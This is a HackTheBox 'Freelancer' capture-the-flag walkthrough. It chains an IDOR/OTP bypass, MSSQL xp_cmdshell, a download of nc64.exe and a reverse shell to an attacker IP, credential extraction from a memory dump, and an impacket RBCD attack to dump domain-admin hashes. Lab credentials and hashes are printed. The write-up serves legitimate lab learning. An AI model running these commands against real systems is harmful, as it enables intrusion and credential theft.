---
date: 2025-03-03
categories: [CTF, HTB]
title: "HTB - Freelancer"
tags: ['bloodhound', 'impacket', 'kerberos', 'linux', 'mimikatz', 'nmap', 'powershell', 'privilege escalation', 'python', 'rce', 'secretsdump', 'smb', 'windows', 'tryhackme', 'hackthebox', 'immersivelabs', 'thm', 'iml', 'htb']

description: "Freelancer - A walkthrough of the challenge with enumeration, exploitation and privilege escalation steps."
---

---
---

# HTB - Freelancer

NMAP

![image1](../resources/b1a16fea82144182983a96dda56c0e0a.png)

Add freelancer.htb to /etc/hosts

- Ran dirsearch:

`dirsearch -u http://freelancer.htb /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt`


- Got admin login page:

![image2](../resources/0fb67fe5eaa64c7e8b72cbedeffb1ef8.png)

**<u>Website Part 1 - UUID</u>**

- Register a normal account

- If we look at the blog posts - we see a user Maya making a comment:

![image3](../resources/434faf817c2844fea2d71d8d12d7d769.png)

- On her page - we can see some of her info
- But the URL is more interesting:

`http://freelancer.htb/accounts/profile/visit/9/`

- If we change the 9 to a 0 or 1, nothing happens, but if we change it to 2:

`http://freelancer.htb/accounts/profile/visit/2/`

- We get an admin:

![image4](../resources/72e8a331a1fd4ec0a66a8ddcb644a62f.png)

**<u>Website Part 2 - IDOR</u>**

- Register an employer account
- When you try and login - it will say "Diabled or not authenticated"
- Click on Forgot Password
- Enter the employer details and set a new password
- Login as employer


![image5](../resources/bd867359113046568e0a82a761d31037.png)

- One thing that stands out is the QR code:

![image6](../resources/2cbc78402e64489cbf334f05d3a110d8.png)

- Download the QR image and import into CyberChef:

![image7](../resources/452da74b576a4e0ebfdd656652c7d191.png)

- We get the output:

`http://freelancer.htb/accounts/login/otp/MTAwMTE=/df3bd010f3bbe9bf29bc988924321026/`


![image8](../resources/4fe23c08c6064d308985cc1bc8ed28a5.png)

- If we go back to the page where we found the admin:

`http://freelancer.htb/accounts/profile/visit/2/`

And change 2 for 10011:


![image9](../resources/9a79928b0c1045309b53128246187d05.png)

- We see the account we made

So this gives a clue that it could be an IDOR vulnerability

<https://medium.com/pentesternepal/tackling-idor-on-uuid-based-objects-71e8cb2dc265>

- If we Base64 the number "2":

![image10](../resources/8119f52e567240beb429a11e506859ef.png)

- Using the QR code link - replace the base64 code:

`http://freelancer.htb/accounts/login/otp/Mgo=/df3bd010f3bbe9bf29bc988924321026/`

- Go to the link - we have admin for the site:

![image11](../resources/c831d287218043569079c9d633e41fba.png)

- Not much here - but if we go to the admin login site:

`http://freelancer.htb/admin/`

- We are logged in:

![image12](../resources/4f74396de87b47bf8ff1a43c9169009b.png)

- On the admin page we get a SQL terminal:

![image13](../resources/f82b9286db0b489a903a1f93c4e71986.png)


![image14](../resources/afa0c215abfb44eb92cec146b78522ac.png)

We can see from the select @@version;

That this is a MSSQL database


![image15](../resources/5df4bd1421014a71ace20b641a571edb.png)

**<u>Getting shell:</u>**

<https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server>

**SQL Server has a special permission, named <u>IMPERSONATE</u>, that allows the executing user to take on the permissions of another user or login until the context is reset or the session ends.**

- First we can try and impersonate the "sa" user (sysadmin):

![image16](../resources/580614d7e22e448ca78b87ea76d0b985.png)

- Success, so we might now be able to execute commands

- To make sure we can execute commands we run the following:
This turns on advanced options which is needed to configure xp_cmdshell.

We then enable xp_cmdshell


![image17](../resources/6ee99b4b8bea4f86b5ddb8608196ef8e.png)

- Now we can get a shell:
Run python server on Kali

Upload nc64.exe to the target server and execute


![image18](../resources/f03f982e17da4735bf7427e5825e54ff.png)

```bash
EXECUTE AS LOGIN = 'sa';

SELECT SYSTEM_USER;

SELECT IS_SRVROLEMEMBER('sysadmin');

EXEC sp_configure 'Show Advanced Options', 1;

RECONFIGURE;

EXEC sp_configure 'xp_cmdshell', 1;

RECONFIGURE;

EXEC xp_cmdshell 'powershell -command "(New-Object System.Net.WebClient).DownloadFile(''http://10.10.14.24/nc64.exe'', ''%TEMP%\nc.exe'')"';
```

**or use: (not both - they do the same thing)**

```bash
EXEC xp_cmdshell 'echo IWR http://10.10.14.24/nc64.exe -OutFile %TEMP%\nc.exe \| powershell -noprofile';

EXEC xp_cmdshell '%TEMP%\nc.exe 10.10.14.24 8888 -e powershell';
```

![image19](../resources/629dad5a9c28432b9f69d30d7ae396bb.png)


![image20](../resources/77a952daa3c74f26a3d59bc6f2010bec.png)

- In the current session as sql_svc - go to Downloads
- In here we see a SQL folder and inside it, a conf file:

![image21](../resources/6fa9d4ac694f490fa98c00ff4882a5d2.png)

- We get passwords:
SQLSVCPASSWORD="IL0v3ErenY3ager"

SAPWD="t3mp0r@ryS@PWD"

- Password spray users with the passwords:

![image22](../resources/e2677116839741e7a41b8f7808a759c9.png)

```bash
crackmapexec smb 10.129.230.52 -u names.txt -p pass.txt -d freelancer

```

![image23](../resources/2d33db92095544989d4fb1301f7227a5.png)

**mikasaAckerman** : **IL0v3ErenY3ager**

- Upload RunasCs.exe and nc64.exe to /temp:

```bash
(New-Object System.Net.WebClient).DownloadFile('http://10.10.14.24/RunasCs.exe', 'C:\temp\RunasCs.exe')

(New-Object System.Net.WebClient).DownloadFile('http://10.10.14.24/nc64.exe', 'C:\temp\nc.exe')

```
- Run as different user:

```bash
./RunasCs.exe mikasaAckerman IL0v3ErenY3ager "./nc.exe -e powershell 10.10.14.24 8889"

```

![image24](../resources/a26112de19174d5daaffa63278eff115.png)


![image25](../resources/f17440965c484bb4993826b6dfcf3c52.png)

```bash
cat user.txt

```
- We get these files on mikasa's Desktop:

![image26](../resources/395f74b939264f40a49e04c756206873.png)

- The mail.txt suggests a memory dump:

![image27](../resources/9e1aa554c5984759a95a2029428e1901.png)

- **<u>Copy MEMORY.7z to Kali:</u>**

![image28](../resources/119719838f874ba483081e8d94e0a186.png)


![image29](../resources/d606190f45a84401bc75e726aec09170.png)


![image30](../resources/e495bdac77794972a2781c0c719a0bae.png)

- If we extract it, we get MEMORY.DMP:

![image31](../resources/f9f71f9eec394ea585764938acc0499c.png)

- **<u>Analyze the memory dump:</u>**
<https://www.synacktiv.com/en/publications/windows-secrets-extraction-a-summary>

<https://cybercop-training.ch/?p=253>

There are different methods.

We can use **Volatility, MemProcFS, Mimikatz, WinDbg**, etc

<https://book.hacktricks.xyz/generic-methodologies-and-resources/basic-forensic-methodology/memory-dump-analysis/volatility-cheatsheet>

- <u>OPTION 1 -</u> MemProcFS on Linux:
<https://github.com/ufrisk/MemProcFS>

- Download binary:

```bash
mkdir /mnt/test
./memprocfs -device ~/HTB/Season5/Freelancer/MEMORY.DMP -forensic 1 -mount /mnt/test -license-accept-elastic-license-2-0
```

- Use a CLI tool to perform a secret dump on some .reghive files

- **<u>OPTION 2 - MemProcFS on Windows:</u>**

- Download Donaky and install the exe:
<https://github.com/dokan-dev/dokany/releases/tag/v2.1.0.1000>
- Install Python and make sure it is in Env variables, System variables, Path
- Download Memprocfs:
<https://github.com/ufrisk/MemProcFS>
- Download the pypykatz plugin:
<https://github.com/ufrisk/MemProcFS-plugins/tree/master/files/plugins/pym_pypykatz>
- Copy the folder and put in:
MemProcFS_files_and_binaries_v5.9.17-win_x64-20240603\\**plugins**\\ folder


![image32](../resources/2ce920ef2b2e41068386f1af1ebba45f.png)

- Run:

```bash
.\MemProcFS.exe -device C:\Users\User\Desktop\MEMORY.DMP -forensic 1 -mount Q -license-accept-elastic-license-2-0

```

![image33](../resources/0fbd8129b42f4118a6a260fbf1b59a5d.png)

- In the mounted filesystem you should see the py folder - Go to:
Q:\py\regsecrets\all


![image34](../resources/f93d87be55364a468179c5d71b688874.png)


![image35](../resources/26bc710409d64155bbd008237d468ddf.png)

- We get the password: **PWN3D#l0rr@Armessa199**

- <u>OPTION 3 - WinDbg + Mimikatz:</u>
  - Install with:

```bash
winget install Microsoft.WinDbg

```
- Opening a process dump:
1\. Open WinDbg (as Administrator)

2\. Click File → Open Crash Dump

3\. Navigate to the dump file and click Open

4\. Wait for WinDbg to open the dump

- Get the hashes:
<https://jamescoote.co.uk/Dumping-LSASS-with-SharpShere/>

- Download Mimikatz and load Mimilib.dll from within WinDbg:

```bash
.load \\vmware-host\Shared Folders\VM Share\mimikatz-master\mimikatz-master\x64\mimilib.dll

```

- Find the LSASS process:
```bash
!process 0 0 lsass.exe

```

![image36](../resources/e3fc5e18ff3f4ecea0743f3622a8dada.png)

- Switch to that process:

```bash
.process /r /p ffffbc83a93e7080

```

![image37](../resources/40cfa7edfa384bd4a5eb3149453de3fa.png)

- Get dump:

```bash
!mimikatz

```

![image38](../resources/d154769e21564d1f9e03c1d5c9eca712.png)

**But it didn't give me lorra199 pass**

- If you get this error:

![image39](../resources/aea08e70e5ab48e9ba55c3f46597de42.png)

Run:

```bash
.reload /f

```
This command forces Windbg to reload the symbols (and downloads missing ones)

- From the dumped passwords we can do a password spray:

![image40](../resources/1a5661abc37340b080ae86bdba1dafc1.png)

- Put all the users in a file - users:

```bash
crackmapexec smb freelancer.htb -u users -p pass

```
**lorra199 : PWN3D#l0rr@Armessa199**

```bash
evil-winrm -i freelancer.htb -u lorra199 -p 'PWN3D#l0rr@Armessa199'

```

![image41](../resources/adb70920b6e24683bd1085072f14d570.png)

- Run bloodhound remotely:

```bash
bloodhound-python -c all -u lorra199 -p 'PWN3D#l0rr@Armessa199' -ns 10.129.213.81 -d freelancer.htb

```

![image42](../resources/06e752686c4448d5998735c0318a36e3.png)


![image43](../resources/48f629c6ccdf404d8c887da52f2fbfb2.png)

- This group has **GenericWrite** over all Users/Computers

![image44](../resources/b1ff382f04354ae082dcbe94d0e6b17b.png)

- **<u>RBCD:</u>**

![image45](../resources/b4c06b1444aa4167b18a0d1c78d63cd7.png)

<https://medium.com/@offsecdeer/a-practical-guide-to-rbcd-exploitation-a3f1a47267d5>

- Set the date and time to DC time:

```bash
sudo date -s "2024-06-07 16:35:00" && sudo hwclock --systohc

```
- Add a new machine account to use:

```bash
impacket-addcomputer -computer-name 'rbcd-test$' -computer-pass 'Password1!' -dc-ip 10.129.213.81 'freelancer.htb/lorra199:PWN3D#l0rr@Armessa199'

```

![image46](../resources/74c05d3d495448ba9cd99d9e1b235b7d.png)

- Write:

```bash
impacket-rbcd -delegate-from 'rbcd-test$' -delegate-to 'DC\$' -dc-ip '10.129.213.81' -action 'write' 'freelancer.htb/lorra199:PWN3D#l0rr@Armessa199'

```

![image47](../resources/2bf5ddffc27c4551a1a81fc0d69e3258.png)

- Read (it shows lorra199 because I added her in a test attempt):

```bash
impacket-rbcd -delegate-to 'DC$' -dc-ip '10.129.213.81' -action 'read' 'freelancer.htb/lorra199:PWN3D#l0rr@Armessa199'

```

![image48](../resources/bcf75c0fa0bf4873a6f6843acab9c064.png)

- Get service ticket:

```bash
impacket-getST -spn "cifs/dc.freelancer.htb" -impersonate Administrator -dc-ip 10.129.213.81 'freelancer.htb/rbcd-test:Password1!'

```

![image49](../resources/52d2b6b5bcb64fd8ad23039018de2579.png)

Make sure **dc.freelancer.htb is in /etc/hosts**

- Dump secrets:

```bash
impacket-secretsdump freelancer.htb/Administrator@dc.freelancer.htb -k -no-pass -just-dc-user Administrator

```

![image50](../resources/9a1240830d154cc6a447d46682b9ef27.png)

- Login with evil-winrm:

```bash
evil-winrm -i freelancer.htb -u Administrator -H 0039318f1e8274633445bce32ad1a290

```

![image51](../resources/0a67c81545a941328c968adc97d0aa4e.png)

- Using BloodyAD:
<https://notes.incendium.rocks/pentesting-notes/windows-pentesting/tools/bloodyad>


![image52](../resources/4f1c2a9516f9459b82f0cb8ee0864803.png)

- Using BloodyAD - we can add RBCD for a service:

```bash
./bloodyAD.py -d freelancer.htb --host 10.129.213.81 -u lorra199 -p 'PWN3D#l0rr@Armessa199' add rbcd DC$ lorra199

```
The above command didn't work because Python url parser broke the string at the \#

- So I converted the password to an NTLM hash online and used that:

```bash
./bloodyAD.py -p ':67D4AE78A155AAB3D4AA602DA518C051' -d freelancer.htb --host 10.129.213.81 -u lorra199 add rbcd DC$ lorra199

```

![image53](../resources/3be0c687d10d4e0b9cac0df75995e2b5.png)